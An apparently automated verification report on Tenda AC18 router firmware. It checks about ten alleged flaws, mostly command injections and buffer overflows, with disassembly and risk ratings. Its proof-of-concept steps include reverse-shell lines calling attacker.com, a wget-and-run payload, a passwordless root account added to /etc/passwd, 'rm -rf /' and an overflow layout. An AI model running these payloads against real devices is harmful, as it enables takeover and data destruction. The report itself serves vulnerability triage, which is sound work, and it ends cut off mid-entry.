# _US_AC18V1.0BR_V15.03.05.05_multi_TD01.bin.extracted - 验证报告 (11 个发现)

---

## 原始信息

- **文件/目录路径：** `bin/busybox`
- **位置：** `busybox:0x0002fe98 fcn.0002f830`
- **描述：** A command injection vulnerability was identified in the mdev applet of BusyBox. The function fcn.0002f830 calls 'system' with a string constructed from environment variables, which are user-controlled. An attacker with valid login credentials (non-root user) can set a malicious environment variable (e.g., containing shell metacharacters) to execute arbitrary commands when mdev is invoked. This vulnerability is triggered when mdev processes device events or is run directly, allowing command injection under the user's context. The attack chain is complete: input (environment variables) -> data flow (retrieved via getenv and used in string) -> dangerous operation (system call).
- **代码片段：**
  ```
  0x0002fa7c      bl sym.imp.getenv           ; Retrieve environment variable
  0x0002fe94      mov r0, r6                  ; String built from environment variable
  0x0002fe98      bl sym.imp.system           ; Execute command via system
  ```
- **备注：** This vulnerability requires the user to execute mdev, which may not always be feasible in all configurations. While it allows command injection, it does not escalate privileges by itself. Further analysis is needed to determine if mdev can be triggered automatically with user environment variables. Additional functions like fcn.00040f94 and fcn.0004699c also call 'system' and should be investigated for similar issues to establish broader exploit chains.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `Medium`
- **详细原因：** 警报描述准确：函数fcn.0002f830在BusyBox的mdev applet中确实使用getenv获取环境变量并构建字符串传递给system，导致命令注入。反编译代码显示，在分支if (pcVar17[uVar19] == '$')中，环境变量名从输入字符串解析，值通过getenv获取并用于构建puVar6，最终在iVar2 = sym.imp.system(puVar6)中执行。攻击者模型为非root用户（具有登录凭证），可通过设置恶意环境变量（如包含shell元字符的命令）并触发mdev（如执行/bin/busybox mdev或通过设备事件）来利用。完整攻击链：用户控制环境变量输入 -> getenv检索 -> 字符串构建 -> system执行。PoC示例：设置环境变量export MDEV_CMD='; id > /tmp/exploit #'，然后执行mdev，如果mdev规则引用$MDEV_CMD，将执行id命令并输出到/tmp/exploit。风险为Medium，因为利用需要用户能执行mdev，并非所有配置默认允许，但一旦触发可在用户上下文中执行任意命令。

## 验证指标

- **验证时长：** 115.89 秒
- **Token 使用量：** 130212

---

## 原始信息

- **文件/目录路径：** `usr/local/udhcpc/sample.renew`
- **位置：** `sample.renew:1 (script start)`
- **描述：** The 'sample.renew' file is a udhcpc hook script with full permissions (777), allowing any user to modify it. When udhcpc (which typically runs with root privileges) executes this script during DHCP lease renewal, the modified commands run with root privileges. This enables privilege escalation: a non-root user can inject malicious code (e.g., adding a reverse shell or modifying critical system files) into the script, which is then executed as root. The script uses environment variables set by udhcpc ($interface, $ip, $router, etc.) and performs operations like ifconfig, route changes, and writing to /etc/resolv.conf, all requiring root access. The attack is triggered when udhcpc renews a DHCP lease, and the exploit is reliable due to the script's writable nature and privileged execution context.
- **代码片段：**
  ```
  #!/bin/sh
  # Sample udhcpc bound script
  
  RESOLV_CONF="/etc/resolv_wisp.conf"
  RESOLV_CONF_STANDARD="/etc/resolv.conf"
  
  [ -n "$broadcast" ] && BROADCAST="broadcast $broadcast"
  [ -n "$subnet" ] && NETMASK="netmask $subnet"
  
  /sbin/ifconfig $interface $ip $BROADCAST $NETMASK
  
  if [ -n "$router" ]
  then
  	echo "deleting routers"
  	while /sbin/route del default gw 0.0.0.0 dev $interface
  	do :
  	done
  
  	for i in $router
  	do
  		/sbin/route add default gw $i dev $interface
  	done
  fi
  
  echo -n > $RESOLV_CONF
  echo -n > $RESOLV_CONF_STANDARD
  #tenda add
  [ $ip ] && echo ip $ip >> $RESOLV_CONF
  [ $subnet ] && echo mask $subnet >> $RESOLV_CONF
  [ $router ] && echo gateway $router >> $RESOLV_CONF
  [ $lease ] && echo lease $lease >> $RESOLV_CONF
  
  [ -n "$domain" ] && echo domain $domain >> $RESOLV_CONF
  [ -n "$domain" ] && echo domain $domain >> $RESOLV_CONF_STANDARD
  for i in $dns
  do
          echo adding dns $i
          echo nameserver $i >> $RESOLV_CONF
          echo nameserver $i >> $RESOLV_CONF_STANDARD
  done
  
  [ "$reloaddns" ] && cfm post netctrl 2?op=17,wan_id=6
  ```
- **备注：** This vulnerability is highly exploitable due to the script's permissions and the privileged context of udhcpc. Further verification could involve checking if udhcpc is configured to use this script and runs as root, but the evidence strongly supports the attack chain. Other files in the directory (e.g., sample.bound, sample.deconfig) have similar permissions and may present additional attack vectors. Recommended mitigation: restrict file permissions to root-only write access and validate script integrity.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报准确描述了漏洞：文件权限为 777（证据：ls -l 显示 -rwxrwxrwx），允许任何用户修改；文件内容与代码片段一致（证据：cat 输出），包含使用 udhcpc 环境变量和执行需要 root 权限的命令（如 /sbin/ifconfig、/sbin/route、写入 /etc/resolv.conf）。攻击者模型是未经身份验证的本地用户（非 root），但触发需要 DHCP 租约更新事件。完整攻击链：1) 攻击者修改脚本（例如，添加反向 shell 或修改系统文件）；2) udhcpc 以 root 权限执行脚本（基于脚本内容和常见行为）；3) 恶意代码以 root 权限运行，实现权限提升。PoC 步骤：作为非 root 用户，编辑 /usr/local/udhcpc/sample.renew，添加命令如 'echo "root::0:0:::/bin/sh" >> /etc/passwd'（添加 root 用户）或 '/bin/nc -e /bin/sh attacker_ip 4444'（反向 shell），然后触发 DHCP 更新（例如，重启网络或等待租约更新）。漏洞高度可利用，风险高。

## 验证指标

- **验证时长：** 133.84 秒
- **Token 使用量：** 136540

---

## 原始信息

- **文件/目录路径：** `bin/httpd`
- **位置：** `httpd:0x0007b2b8 sym.formexeCommand`
- **描述：** 命令注入漏洞存在于 sym.formexeCommand 函数中，允许经过身份验证的攻击者执行任意系统命令。具体表现：函数通过 fcn.0002b884 获取 HTTP 请求中的 'cmdinput' 参数，使用 strcpy 复制到局部缓冲区（大小 256 字节），然后直接用于构造 doSystemCmd 命令（如 'echo %s > /tmp/cmdTmp.txt' 和 '%s > /tmp/cmdTmp.txt'）。由于缺少输入验证、过滤或转义，攻击者可以注入 shell 元字符（如 ;、|、&、`）来执行恶意命令。触发条件：攻击者发送恶意 HTTP 请求到 formexeCommand 端点，包含 crafted 'cmdinput' 参数。约束条件：攻击者需拥有有效登录凭据（非 root 用户），但 httpd 进程可能以 root 权限运行，从而提升权限。潜在攻击和利用方式：注入命令如 'rm -rf /' 删除文件或 'nc -e /bin/sh attacker.com 4444' 启动反向 shell，完全控制设备。相关代码逻辑：用户输入直接传播到 doSystemCmd，无边界检查或验证。
- **代码片段：**
  ```
  // 从 HTTP 请求获取用户输入
  uVar2 = fcn.0002b884(*(puVar5 + (0xdcec | 0xffff0000) + iVar1 + -0xc), iVar4 + *0x7b5a8, iVar4 + *0x7b5ac);
  *(puVar5 + -0xc) = uVar2;
  // 使用 strcpy 复制用户输入到缓冲区
  sym.imp.strcpy(puVar5 + iVar1 + -0x21c, *(puVar5 + -0xc));
  // 调用 doSystemCmd 执行命令，用户输入直接嵌入
  sym.imp.doSystemCmd(iVar4 + *0x7b5c0, puVar5 + iVar1 + -0x21c); // 例如: 'echo %s > /tmp/cmdTmp.txt'
  sym.imp.doSystemCmd(iVar4 + *0x7b5c4, puVar5 + iVar1 + -0x21c); // 例如: '%s > /tmp/cmdTmp.txt'
  ```
- **备注：** 漏洞已验证通过代码分析：用户输入从 HTTP 参数直接传播到 doSystemCmd，无中间验证。攻击链完整且可重现。建议检查其他 doSystemCmd 调用点（如 sym.formSetClientState）是否有类似问题。后续分析应关注输入验证缺失的组件交互，特别是通过 NVRAM 或 IPC 的数据流。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报准确描述了命令注入漏洞。证据来自 Radare2 分析：sym.formexeCommand 函数在地址 0x0007b220 调用 fcn.0002b884 获取 'cmdinput' HTTP 参数，在 0x0007b234 使用 strcpy 复制到缓冲区，并在多个位置（如 0x0007b2b8、0x0007b304、0x0007b43c）直接嵌入 doSystemCmd 调用，无任何验证或转义。攻击者模型为经过身份验证的远程用户（非 root），但 httpd 可能以 root 权限运行，允许权限提升。输入可控（通过 HTTP 请求）、路径可达（函数通过 HTTP 端点暴露），且实际影响严重（任意命令执行）。可重现的 PoC：攻击者发送恶意 HTTP POST 请求到 formexeCommand 端点，包含 'cmdinput' 参数如 '; nc -e /bin/sh attacker.com 4444'，注入 shell 元字符执行反向 shell，完全控制设备。

## 验证指标

- **验证时长：** 142.70 秒
- **Token 使用量：** 167259

---

## 原始信息

- **文件/目录路径：** `usr/bin/spawn-fcgi`
- **位置：** `spawn-fcgi:0x95dc-0x9648 sym.fcgi_spawn_connection`
- **描述：** A command injection vulnerability exists in the 'spawn-fcgi' binary when handling the -f option without providing positional arguments. The vulnerability arises in the fcgi_spawn_connection function, where user-controlled input from the -f option is concatenated into a shell command without proper sanitization. When no FastCGI application arguments are provided (i.e., no positional arguments after --), the program constructs a command string using strcat with the value from -f and executes it via /bin/sh -c. An attacker can exploit this by injecting shell metacharacters (e.g., ;, &, |) in the -f argument to execute arbitrary commands. The trigger condition is when spawn-fcgi is run with the -f option and no positional arguments. As a non-root user, the injected commands run with the same privileges, potentially allowing command execution in contexts where spawn-fcgi is used, though it does not escalate privileges directly.
- **代码片段：**
  ```
  0x000095dc      90001be5       ldr r0, [s2]                ; const char *s
  0x000095e0      cffdffeb       bl sym.imp.strlen           ; size_t strlen(const char *s)
  0x000095e4      0030a0e1       mov r3, r0
  0x000095e8      063083e2       add r3, r3, 6
  0x000095ec      0300a0e1       mov r0, r3                  ; size_t size
  0x000095f0      65fdffeb       bl sym.imp.malloc           ; void *malloc(size_t size)
  0x000095f4      0030a0e1       mov r3, r0
  0x000095f8      20300be5       str r3, [s1]                ; 0x20 ; 32
  0x000095fc      50390ae3       movw r3, str.exec           ; 0xa950 ; "exec "
  0x00009600      003040e3       movt r3, 0                  ; 0xa950 ; "exec "
  0x00009604      20001be5       ldr r0, [s1]                ; 0x20 ; 32 ; void *s1
  0x00009608      0310a0e1       mov r1, r3                  ; 0xa950 ; "exec " ; const void *s2
  0x0000960c      0620a0e3       mov r2, 6
  0x00009610      51fdffeb       bl sym.imp.memcpy           ; void *memcpy(void *s1, const void *s2, size_t n)
  0x00009614      90301be5       ldr r3, [s2]                ; 0x90 ; 144
  0x00009618      20001be5       ldr r0, [s1]                ; 0x20 ; 32 ; char *s1
  0x0000961c      0310a0e1       mov r1, r3                  ; const char *s2
  0x00009620      7afdffeb       bl sym.imp.strcat           ; char *strcat(char *s1, const char *s2)
  0x00009624      0030a0e3       mov r3, 0
  0x00009628      00308de5       str r3, [sp]
  0x0000962c      58090ae3       movw r0, str._bin_sh        ; 0xa958 ; "/bin/sh"
  0x00009630      000040e3       movt r0, 0                  ; 0xa958 ; "/bin/sh"
  0x00009634      60190ae3       movw r1, str.sh             ; 0xa960 ; "sh"
  0x00009638      001040e3       movt r1, 0                  ; 0xa960 ; "sh"
  0x0000963c      64290ae3       movw r2, str._c             ; 0xa964 ; "-c"
  0x00009640      002040e3       movt r2, 0                  ; 0xa964 ; "-c"
  0x00009644      20301be5       ldr r3, [s1]                ; 0x20 ; 32
  0x00009648      46fdffeb       bl sym.imp.execl            ; int execl(const char *path, const char *arg0, ...)
  ```
- **备注：** This vulnerability requires the attacker to have the ability to execute spawn-fcgi with control over the -f option and without providing positional arguments. While it does not grant privilege escalation beyond the current user, it could be used in broader attack chains or in environments where spawn-fcgi is invoked by scripts or other processes. Further analysis could explore other input vectors or interactions with system components.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `Medium`
- **详细原因：** 安全警报准确描述了命令注入漏洞。在 'fcgi_spawn_connection' 函数中，当没有提供位置参数时（即 no positional arguments after --），程序使用 strcat 将 '-f' 选项值拼接到 'exec ' 字符串中，然后通过 execl("/bin/sh", "sh", "-c", command, NULL) 执行。攻击者模型：攻击者需要能控制 spawn-fcgi 的 '-f' 参数且确保无位置参数（例如，通过调用 spawn-fcgi -f '恶意值'）。输入可控，路径可达（代码条件分支可触发），实际影响是任意命令执行，权限与 spawn-fcgi 进程相同。可重现的 PoC：运行 spawn-fcgi -f 'legit; malicious_command'，其中 malicious_command 是任意 shell 命令（如 whoami），将执行恶意命令。漏洞风险中等，因为需要特定调用条件，但若 spawn-fcgi 以高权限运行，可能升级为高危。

## 验证指标

- **验证时长：** 240.71 秒
- **Token 使用量：** 304334

---

## 原始信息

- **文件/目录路径：** `usr/lib/libnetconf.so`
- **位置：** `libnetconf.so:0x00002ba0 sym.netconf_add_fw`
- **描述：** 在 sym.netconf_add_fw 函数中，处理用户提供的字符串（如接口名称或规则参数）时，使用了 strncpy 进行字符串复制，但随后使用 strlen 计算输入长度并用于 memset 操作。由于没有验证输入字符串长度，如果输入超长（超过目标缓冲区大小），可能导致缓冲区溢出。目标缓冲区通过 calloc(1, 0x70) 分配，大小为 112 字节。具体地，当处理 param_1 + 0x22 和 param_1 + 0x32 的字符串时，strncpy 复制到偏移 0x10 和 0x20，而 memset 从偏移 0x30 和 0x40 开始，使用 strlen 结果加 1 作为长度。如果 strlen 返回大值（例如，超过 64 字节），memset 将写入超出缓冲区边界，覆盖相邻内存。攻击者可通过控制输入字符串触发此漏洞，可能覆盖函数返回地址或关键数据，执行任意代码。触发条件：攻击者提交恶意防火墙规则配置，其中包含超长字符串字段。利用方式：通过网络接口（如 HTTP API）或 IPC 调用相关功能，提交特制数据。
- **代码片段：**
  ```
  相关代码片段来自反编译：
  if (*(param_1 + 0x22) != '\0') {
      loc.imp.strncpy(*(puVar21 + -8) + 0x10, param_1 + 0x22);
      iVar7 = loc.imp.strlen(param_1 + 0x22);
      loc.imp.memset(iVar11 + 0x30, 0xff, iVar7 + 1);
  }
  if (*(param_1 + 0x32) != '\0') {
      loc.imp.strncpy(*(puVar21 + -8) + 0x20, param_1 + 0x32, 0x10);
      iVar7 = loc.imp.strlen(param_1 + 0x22);  // 注意：这里使用了 param_1 + 0x22 的 strlen，可能错误
      loc.imp.memset(iVar11 + 0x40, 0xff, iVar7 + 1);
  }
  ```
- **备注：** 漏洞需要调用上下文来完全验证利用链，例如通过哪个服务或程序调用此函数（如网络配置界面）。建议进一步分析使用此库的二进制文件（如网络守护进程）以确认输入点。关联函数：sym.netconf_get_fw（但未发现类似漏洞）。在 ARM 架构上，缓冲区溢出可能覆盖返回地址，导致代码执行。由于攻击者拥有登录凭据，可能通过已有接口触发。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报准确描述了 libnetconf.so 中 sym.netconf_add_fw 函数的缓冲区溢出漏洞。反汇编代码显示：1) 缓冲区通过 calloc(1, 0x70) 分配，大小为 112 字节；2) 在地址 0x2f40-0x2f88 和 0x2ecc-0x2f10 处，使用 strncpy 复制字符串到缓冲区偏移 0x10 和 0x20（最多 16 字节），但随后使用 strlen 计算源字符串长度（param_1+0x22）并用于 memset 从缓冲区偏移 0x30 和 0x40 开始写入。如果 strlen 返回大值（例如超过 64 字节），memset 将写入超出缓冲区边界，导致堆溢出。攻击者模型为经过身份验证的远程攻击者（如通过网络接口提交防火墙规则配置），可控制 param_1+0x22 和 param_1+0x32 的输入字符串。漏洞路径可达：只要字符串非空即执行易受攻击代码。实际影响：堆溢出可能覆盖相邻堆内存（如函数指针或数据），在 ARM 架构上可能实现任意代码执行。PoC 步骤：攻击者提交特制防火墙配置，其中 param_1+0x22 字段包含长字符串（如 100 字节），触发 strlen 返回大值，导致 memset 写入 101 字节从偏移 0x30 开始，溢出缓冲区。类似步骤适用于第二个块。漏洞风险高，因需要身份验证但可能导致完全代码执行。

## 验证指标

- **验证时长：** 248.96 秒
- **Token 使用量：** 341790

---

## 原始信息

- **文件/目录路径：** `lib/modules/NetUSB.ko`
- **位置：** `NetUSB.ko:0x0800e110 (函数 sym.tcpConnector)`
- **描述：** 在 'NetUSB.ko' 的 `tcpConnector` 函数中，发现一个栈缓冲区溢出漏洞。具体表现：函数使用 `memcpy` 将输入字符串复制到固定大小的栈缓冲区（32字节），但未使用 `strlen` 检查输入长度，导致溢出。触发条件：当输入字符串长度超过32字节时，栈上的返回地址或其他关键数据可能被覆盖，允许攻击者控制程序流。潜在利用方式：攻击者作为已连接用户，可通过网络发送特制数据到 TCP 服务，触发溢出并执行任意代码。相关代码逻辑包括套接字创建、设置选项和字符串复制操作。
- **代码片段：**
  ```
  0x0800e0ec      0c708de2       add r7, var_ch           ; r7 指向栈缓冲区
  0x0800e0f0      2010a0e3       mov r1, 0x20             ; 缓冲区大小 32 字节
  0x0800e0f4      0700a0e1       mov r0, r7               ; 目标缓冲区
  0x0800e0f8      feffffeb       bl __memzero             ; 初始化缓冲区
  0x0800e0fc      0600a0e1       mov r0, r6               ; 输入字符串参数
  0x0800e100      feffffeb       bl strlen                ; 获取输入长度
  0x0800e104      0610a0e1       mov r1, r6               ; 源字符串
  0x0800e108      0020a0e1       mov r2, r0               ; 长度（无检查）
  0x0800e10c      0700a0e1       mov r0, r7               ; 目标缓冲区
  0x0800e110      feffffeb       bl memcpy                ; 复制操作，可能溢出
  ```
- **备注：** 漏洞存在于内核模块中，可能允许特权提升。攻击链需要攻击者已拥有网络访问权限并能够发送数据到 TCP 服务。建议进一步分析 `tcpConnector` 的调用者以确认输入源，并检查其他函数（如 `udpAnnounce`）是否存在类似问题。可利用性取决于网络服务的暴露程度和缓解措施（如栈保护）。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述准确：代码在tcpConnector函数中显示栈缓冲区分配（32字节）、使用strlen获取输入长度、并通过memcpy复制而不检查长度，导致溢出。攻击者模型为远程攻击者能连接到TCP服务（如通过网络套接字）。输入可控（参数r6来自网络数据），路径可达（服务暴露时攻击者可触发函数），实际影响为栈溢出可能覆盖返回地址，允许内核模式任意代码执行和特权提升。PoC步骤：1. 攻击者识别运行NetUSB模块的TCP服务端口（需额外枚举）。2. 构建长字符串（至少108字节），其中前32字节为任意数据，字节32-103为填充数据，字节104-107包含恶意返回地址（如指向shellcode）。3. 发送该字符串到服务，触发memcpy溢出，覆盖返回地址并控制程序流。漏洞风险高，因涉及内核模块。

## 验证指标

- **验证时长：** 262.86 秒
- **Token 使用量：** 352813

---

## 原始信息

- **文件/目录路径：** `usr/sbin/udhcpd`
- **位置：** `udhcpd:0xa5cc fcn.0000a45c`
- **描述：** 命令注入漏洞存在于 fcn.0000a45c 函数中，该函数使用 sprintf 构建命令字符串并调用 system。攻击者可通过修改配置文件（如 /etc/udhcpd.conf）中的 'script' 或 'interface' 字段注入恶意命令。当 udhcpd 处理配置时（例如在定期任务或初始化期间），system 调用会执行注入的命令，导致任意代码执行。触发条件包括：1) 配置文件可由非root用户写入；2) udhcpd 以 root 权限运行（常见于 DHCP 服务器）。潜在攻击包括获取 root shell、修改系统配置或持久化访问。代码逻辑显示，system 参数直接来自 server_config 结构，缺少输入验证或转义。
- **代码片段：**
  ```
  0x0000a5b8: add r4, string
  0x0000a5bc: mov r0, r4
  0x0000a5c0: ldr r1, [0x0000a618]  ; "%s %s"
  0x0000a5c4: ldr r3, [r3, 0x40]   ; server_config->interface
  0x0000a5c8: ldr r2, [r3, 0x48]   ; server_config->script
  0x0000a5cc: bl sym.imp.sprintf   ; 构建命令字符串
  0x0000a5d0: mov r0, r4
  0x0000a5d4: bl sym.imp.system     ; 执行命令
  ```
- **备注：** 攻击链完整但依赖于配置文件权限。假设 /etc/udhcpd.conf 可由非root用户写入（需在实际环境中验证）。建议检查文件权限和 udhcpd 运行上下文。关联函数包括 fcn.0000a148（配置文件解析）。后续分析应验证配置加载过程和权限设置。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报准确描述了命令注入漏洞。证据来自代码分析：在函数fcn.0000a45c中，sprintf使用'%s %s'格式直接拼接server_config->interface和server_config->script字段（地址0x0000a5c4和0x0000a5c8），然后调用system执行（地址0x0000a5d4）。配置文件解析函数fcn.0000a148显示这些字段从配置文件读取，缺少输入验证或转义。攻击者模型基于已通过身份验证的本地用户（能修改配置文件如/etc/udhcpd.conf）或远程攻击者（如果配置文件可通过网络服务修改）。完整攻击链验证：攻击者可控输入（配置文件字段）、路径可达（udhcpd处理配置时执行该函数）、实际影响（root权限任意代码执行）。PoC步骤：1) 攻击者编辑配置文件，在'script'或'interface'字段注入命令（如script '; malicious_command'）；2) 重启udhcpd或触发配置重新加载；3) system执行拼接的命令，导致恶意命令以root权限运行。漏洞风险高，因udhcpd通常以root权限运行。

## 验证指标

- **验证时长：** 278.34 秒
- **Token 使用量：** 384382

---

## 原始信息

- **文件/目录路径：** `bin/dhttpd`
- **位置：** `bin:0x00034b3c sym.formGetWanErrerCheck (GetValue call for 'lan.ip'), bin:0x00034b90 sym.formGetWanErrerCheck (GetValue call for 'd.lan.ip')`
- **描述：** 该函数在处理 NVRAM 变量 'lan.ip' 和 'd.lan.ip' 时存在缓冲区溢出漏洞。函数使用 GetValue 将变量值复制到固定大小的栈缓冲区（16 字节），但未进行大小验证。攻击者可通过设置这些变量为超过 16 字节的字符串来溢出缓冲区，覆盖相邻栈数据（包括返回地址），从而实现任意代码执行。触发条件包括：攻击者拥有有效登录凭据，可访问 web 接口并设置 NVRAM 变量；当 sym.formGetWanErrerCheck 被调用（例如通过 HTTP CGI 请求）时，漏洞被触发。潜在利用方式包括通过溢出控制程序流，执行 shellcode 或提升权限。
- **代码片段：**
  ```
  0x00034b3c      0310a0e1       mov r1, r3                  ; buffer 's' for GetValue
  0x00034b40      e353ffeb       bl sym.imp.GetValue          ; calls GetValue("lan.ip", buffer)
  ...
  0x00034b8c      0310a0e1       mov r1, r3                  ; same buffer 's' for GetValue
  0x00034b90      cf53ffeb       bl sym.imp.GetValue          ; calls GetValue("d.lan.ip", buffer)
  ; Buffer 's' is initialized to 16 bytes via memset at 0x00034b74:
  0x00034b74      1020a0e3       mov r2, 0x10                ; size 16 bytes
  0x00034b78      c353ffeb       bl sym.imp.memset           ; memset(s, 0, 0x10)
  ```
- **备注：** 该漏洞可直接通过 NVRAM 操作利用，但需进一步验证设备特定配置（如 ASLR、栈保护）。建议检查其他使用 GetValue 而无大小检查的函数。关联文件包括 NVRAM 相关库（如 libnvram.so），后续分析应关注 HTTP 请求处理流程以确认触发路径。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** The alert accurately describes a buffer overflow vulnerability in sym.formGetWanErrerCheck in bin/dhttpd. Evidence from disassembly shows: 1) At 0x00034b74, memset initializes a 16-byte stack buffer. 2) At 0x00034b3c and 0x00034b90, GetValue calls copy NVRAM variables 'lan.ip' and 'd.lan.ip' into this buffer without size validation. The lack of bounds checking allows overflow if the variables exceed 16 bytes. Attack model: an authenticated remote attacker (with valid login credentials) can set these NVRAM variables via the web interface and trigger the function through an HTTP CGI request (e.g., by accessing a specific endpoint that invokes sym.formGetWanErrerCheck). This provides a complete exploit chain: controllable input (NVRAM variables), reachable path (CGI handler), and actual impact (stack overflow can overwrite return address for arbitrary code execution). PoC steps: 1) As an authenticated user, set 'lan.ip' to a string longer than 16 bytes (e.g., 'A'*20). 2) Trigger the vulnerability by sending an HTTP request to the CGI endpoint that calls sym.formGetWanErrerCheck. 3) The overflow overwrites adjacent stack data, allowing control of program flow. Mitigations like ASLR or stack protection are not confirmed in this analysis but are often absent in embedded devices, increasing exploitability.

## 验证指标

- **验证时长：** 350.75 秒
- **Token 使用量：** 409466

---

## 原始信息

- **文件/目录路径：** `usr/bin/app_data_center`
- **位置：** `app_data_center:0xa7c0 sym.process_datamanage_usbeject`
- **描述：** 在 'app_data_center' 文件中发现命令注入漏洞。攻击链起始于 FastCGI 请求中的用户可控输入（如 'device' 参数），通过 'process_datamanage_usbeject' 函数处理。该函数使用 'snprintf' 构建 'umount %s' 命令字符串，其中 '%s' 直接来自用户输入，未经过滤或转义，然后调用 'system' 执行。攻击者可通过注入分号或其它命令分隔符执行任意命令。触发条件：攻击者发送特定请求（如 REQUEST_METHOD 对应 'usbeject' 功能）并控制 'device' 参数。利用方式：例如，设置 'device' 为 '/dev/sda1; malicious_command'，导致 'umount /dev/sda1; malicious_command' 执行。约束条件：函数仅检查 'device' 是否以 'usb' 开头，但不防止命令注入。
- **代码片段：**
  ```
  uint sym.process_datamanage_usbeject(uint param_1,uint param_2) {
      // ... 代码省略 ...
      uVar1 = sym.get_querry_var(puVar3[-0x204],0xaee8 | 0x10000); // 获取 'device' 参数
      puVar3[-2] = uVar1;
      // ... 代码省略 ...
      sym.imp.snprintf(puVar3 + -0x808 + -4,0x800,0xaf04 | 0x10000,puVar3[-3]); // 格式化命令 "umount %s"
      sym.imp.system(puVar3 + -0x808 + -4); // 执行命令
      // ... 代码省略 ...
  }
  ```
- **备注：** 此漏洞允许命令注入，但实际影响取决于 'app_data_center' 服务的运行权限（如是否以 root 运行）。建议进一步验证服务配置和权限。关联函数包括 'do_request_process' 和 'get_querry_var'。后续分析应检查其他输入点（如 'process_datamanage_usblist'）是否有类似问题。

## 验证结论

- **描述准确性：** `partially`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报部分准确：命令注入漏洞确实存在于 'app_data_center' 文件的 'process_datamanage_usbeject' 函数中，但警报中的一些细节不精确。具体来说：
- 漏洞核心验证：用户可控的 'dev_name' 参数（而非 'device'）通过 'get_querry_var' 获取，未经过滤或转义，直接用于 snprintf 构建命令字符串 'cfm post netctrl 51?op=3,string_info=%s'，并通过 system 执行。这允许命令注入。
- 攻击者模型：未经身份验证的远程攻击者，通过发送 FastCGI 请求触发 'do_request_process' 函数（当请求参数为 'datamanage' 时调用 'process_datamanage_usbeject'），并控制 'dev_name' 参数。
- 完整攻击链：攻击者发送请求如设置 'dev_name' 为 'valid; malicious_command'，导致 system 执行 'cfm post netctrl 51?op=3,string_info=valid; malicious_command'，从而执行任意命令。
- 可利用性证据：代码显示没有输入过滤，路径可达（通过 'do_request_process' 调用），且 system 执行具有实际安全影响（如远程代码执行）。
- 不准确之处：警报中提到的 'umount %s' 格式字符串不正确（实际为 'cfm post netctrl...'），且检查条件针对 'action' 参数与 'fdel'，而非 'device' 与 'usb'。
PoC 步骤：攻击者构造 HTTP 请求到 'app_data_center' 服务，设置请求参数为 'datamanage' 并包含 'dev_name' 参数，值为 '/dev/sda1; wget http://attacker.com/malicious.sh -O /tmp/malicious.sh && sh /tmp/malicious.sh'。这将导致命令注入和执行恶意脚本。

## 验证指标

- **验证时长：** 393.41 秒
- **Token 使用量：** 418264

---

## 原始信息

- **文件/目录路径：** `usr/sbin/td_acs_dbg`
- **位置：** `td_acs_dbg:0x00008708 fcn.00008708 (sendto call)`
- **描述：** The td_acs_dbg binary contains an information disclosure vulnerability where uninitialized stack memory is sent over IPC. During command execution, the program constructs a 24-byte command structure but only initializes 20 bytes, leaving the last 4 bytes uninitialized. When sendto is called, these 4 bytes of stack memory are transmitted to the server socket. An attacker with valid login credentials can exploit this by creating a malicious UDP server at /tmp/td_acs_dbg_svr to receive the leaked data. The leaked memory may contain pointers, return addresses, or other sensitive data, which could be used to bypass ASLR or facilitate other attacks. The vulnerability is triggered when any command is executed that involves sending data to the server, which is most command operations given the program's design.
- **代码片段：**
  ```
  // From decompilation: sendto sends 24 bytes from iVar1, but only 20 bytes are initialized
  iVar1 = puVar12 + -0x24; // points to stack buffer
  // Initialization of fields (20 bytes):
  *(puVar12 + -0x24) = 0; // field0
  *(puVar12 + -0x20) = 0; // field1
  *(puVar12 + -0x1c) = uVar5; // field2 (uVar5=0)
  *(puVar12 + -0x18) = uVar5; // field3
  *(puVar12 + -0x14) = uVar5; // field4 (set later based on command)
  *(puVar12 + -0x10) = uVar5; // field5 (set later based on command)
  // sendto call transmits 24 bytes, including uninitialized data beyond -0x10
  sym.imp.sendto(iVar8, iVar1, 0x18, 0); // 0x18 = 24 bytes
  ```
- **备注：** The vulnerability requires the attacker to set up a malicious server at /tmp/td_acs_dbg_svr, which is feasible due to world-writable /tmp directory. While this does not directly lead to code execution, it can aid in information gathering for more severe attacks. The binary's world-writable permissions (-rwxrwxrwx) are a separate security issue that could allow privilege escalation if combined with other vulnerabilities. Further analysis of the server component (td_acs_dbg_svr) is recommended to assess full impact.

## 验证结论

- **描述准确性：** `inaccurate`
- **是否为真实漏洞：** `False`
- **风险级别：** `N/A`
- **详细原因：** The security alert claims uninitialized stack memory is sent via sendto, but code analysis reveals that the 24-byte buffer at puVar12 + -0x24 is fully initialized to zero before being sent. All six 4-byte fields (from -0x24 to -0x10) are set in the initialization sequence, and no code path leaves any part uninitialized. The sendto call at 0x8a44 transmits 24 bytes from this initialized buffer, so no information disclosure occurs. The attack model (authenticated user with malicious UDP server) does not apply as there is no leak to exploit. Thus, the vulnerability is not present.

## 验证指标

- **验证时长：** 426.19 秒
- **Token 使用量：** 437572

---

## 原始信息

- **文件/目录路径：** `usr/sbin/comad`
- **位置：** `comad:0x8734 fcn.00008734`
